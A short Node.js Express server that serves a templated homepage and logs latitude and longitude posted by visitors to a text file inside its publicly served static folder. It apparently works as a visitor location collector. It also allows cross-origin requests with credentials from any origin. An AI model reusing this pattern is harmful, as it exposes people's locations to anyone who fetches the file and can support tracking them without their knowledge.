import express from 'express'
import fs, { writeFileSync } from 'fs'
let app = express()
import path from 'path';
import {fileURLToPath} from 'url';
import { sendmail } from './sendmail.js';
import bodyParser from 'body-parser';
import cors from 'cors'
import { getHomepage } from './template.js';
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
// import template from './template'
import * as dotenv from 'dotenv' // see https://github.com/motdotla/dotenv#how-do-i-use-dotenv-with-import
dotenv.config() 

console.log('directory-name 👉️',path.join(__dirname,"static"));
app.use(express.static(path.join(__dirname,"static")))
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json('application/json'));
app.use(cors({credentials: true, origin: true}));
 

let router = express.Router()
let PORT= process.env.PORT || 7000

router.get('/' ,(req,res)=>{
         
  res.send(getHomepage(process.env.ROOT_URL))
     
})
 




router.post('/get-location' ,(req,res)=>{
       console.log("req.query" , req.body )
        let longitude = req.body.lg
        let lattitude = req.body.lt
         
         fs.appendFile( path.join(__dirname,"/static/file.txt"), `
          ----------------------------------
         latitude : ${lattitude}  \n 
         longitude : ${longitude}
         --------------------------------
         ` , function (err) {
            if (err) throw err;
            console.log('Saved!');
          } )
       res.send({message:"setup success"})   
})


router.get('/image' ,(req,res)=>{
     res.send({
           message:"idk"
     })
})

 

app.use(router)


app.listen(PORT, ()=>{
     console.log("server started at 7000 ");
} )
